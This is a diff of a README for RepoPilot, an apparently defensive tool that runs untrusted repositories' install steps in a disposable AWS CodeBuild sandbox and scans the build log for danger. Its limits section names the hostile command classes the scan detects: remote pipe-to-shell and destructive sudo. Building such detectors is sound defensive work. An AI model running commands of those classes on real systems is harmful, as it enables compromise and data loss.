-│   └── index.html               # premium single-file demo UI
+│   ├── setup_sandbox.sh            # create the CodeBuild project + least-privilege role
+│   └── teardown_sandbox.sh         # destroy everything (no lingering cost)
+├── iam/
+│   ├── codebuild-trust.json        # CodeBuild assume-role
+│   └── codebuild-permissions.json  # least-privilege: CloudWatch Logs only
 └── docs/
-    └── architecture.html        # the How It Works diagram (source for architecture.png)
+    ├── index.html                  # the before/after toggle demo (v1 reads / v2 runs)
+    └── replay-data.json            # real recorded run output for the static demo
 ```
 
 ---
 
-## 🔐 Least-Privilege IAM
+## 🔐 Least-Privilege & Safety
 
-The agent's only non-read action is `bedrock:InvokeModel` scoped to Nova Pro. The deployment role gets just that plus basic Lambda logging. Policy ships at [`iam/bedrock-invoke-policy.json`](iam/bedrock-invoke-policy.json).
+- The CodeBuild service role can do **only** CloudWatch Logs (`iam/codebuild-permissions.json`).
+  The clone + install need no AWS permissions, so none are granted.
+- Short build timeout; the container is **ephemeral and destroyed** after each run.
+- The untrusted code runs **in AWS, never on your machine**, which is the entire safety argument.
+- Teardown script removes the project, role, and log group so nothing lingers or bills.
 
 ---
 
 ## 🧾 An Honest Take
 
-Grounded in actually building and deploying this, not a marketing page.
+**What is genuinely strong**
+- It actually runs the code and reads the real log. That is a categorically better signal than
+  static README scanning for install-time danger.
+- The verdict logic is separated from the AWS plumbing behind an injectable client, so it is
+  unit-tested without AWS and the AWS calls are a thin, auditable seam.
+- A real bug (YAML breaking on quoted install commands) was caught during a live run and fixed
+  with a base64-encoded script. The tests now cover exactly that case.
 
-**What's genuinely good**
-- The pure-Python tools are deterministic and unit-tested, so the agent's facts are trustworthy and the single Nova Pro call only handles *tone*, not correctness.
-- Dropping `requests` for the stdlib made the Lambda package 13KB and killed a Python-3.9-vs-3.12 dependency clash. Fewer deps, fewer surprises.
-- The offline fallback means a demo never dead-ends on a network or credentials hiccup.
-
-**Where it made us work / honest limits**
-- Public Lambda **Function URLs can be blocked at the account level** (SCP / public-access setting). If yours is, invoke the function directly or front it with API Gateway. The agent is identical either way.
-- The error-recovery tool recognizes the **common** first-run errors by pattern; anything unrecognized is handed to the model with a kind "let's figure it out together" message rather than a false fix.
-- README-vs-reality is heuristic (it checks for referenced files/commands), not a full build, so it catches the frequent drift, not every possible lie.
+**Honest limits**
+- The sandbox runs the **install** step (where install-time attacks fire and most first-run
+  failures happen), not the full app. That is the deliberate, fast, safe scope.
+- The danger scan is pattern-based over the log; it catches the common, high-signal classes
+  (remote-pipe-to-shell, destructive sudo), not every conceivable obfuscation.
+- CodeBuild has outbound network by default (install needs it); for a stricter posture you would
+  lock egress to a proxy allow-list. Noted, not done in this weekend scope.
 
 ---
 
 ## ❓ FAQ
 
-**Is this a real agent or just a prompt?**
-Real agent. It calls tools that read the actual repo and reason over the result, then uses the model only to narrate. The logic lives in code, not a prompt.
+**Is this a real tool or a prompt trick?**
+Real. `run_in_sandbox` calls AWS CodeBuild, runs the install, and reads the real CloudWatch log.
+The model only narrates the result.
 
-**Does it need a paid anything?**
-No. It runs on AWS Free Tier (Lambda + Bedrock Nova Pro, pennies per run). The tools and offline CLI run with no AWS at all.
+**Is my machine ever at risk?**
+No. The untrusted install runs inside a disposable AWS container, not on your laptop.
 
-**What AWS services does it use?**
-Amazon Bedrock (Amazon Nova Pro) for reasoning, and AWS Lambda + Function URL for the deployed, callable agent.
+**What AWS service is the tool?**
+AWS CodeBuild (the disposable sandbox) plus CloudWatch Logs (to read the real build log). The
+agent reasons with Amazon Bedrock (Nova Pro) via the Strands Agents SDK.
 
-**Can it break my machine?**
-No. RepoPilot only *reads* public repos and *suggests* commands. It never runs anything on your machine.
+**Does the live demo cost anything?**
+No. It is a static replay of real recorded runs, so it makes zero AWS calls.
+
+---
+
+## 🔗 Links
+
+- ▶️ Demo video: _YouTube URL (added on publish)_
+- 🖥️ Live before/after toggle: _GitHub Pages URL (added on publish)_
 
 ---
 
@@ -429,10 +377,10 @@ Apache-2.0. See [LICENSE](LICENSE).
 
 **Sarvar Nadaf** · Cloud Architect · AI Infrastructure & DevOps
 
-[LinkedIn](https://www.linkedin.com/in/sarvar04/) · [GitHub](https://github.com/simplynadaf) · [Dev.to](https://dev.to/sarvar_04) · [YouTube](https://www.youtube.com/@sarvar-nadaf) · [AWS Builder Center](https://builder.aws.com/community/@sarvar)
+[Portfolio](https://sarvarnadaf.com) · [LinkedIn](https://www.linkedin.com/in/sarvar04/) · [GitHub](https://github.com/simplynadaf) · [Dev.to](https://dev.to/sarvar_04) · [YouTube](https://www.youtube.com/@sarvar-nadaf) · [AWS Builder Center](https://builder.aws.com/community/@sarvar)
 
-**If RepoPilot gave you a calmer first run, consider a ⭐**
+*Built on AWS: CodeBuild · Amazon Bedrock (Nova Pro) · Strands Agents*
 
-*Built with 💜 on AWS: Strands · Amazon Nova Pro · AWS Lambda*
+**If this made you think twice before your next `npm install`, consider a ⭐**
 
 </div>
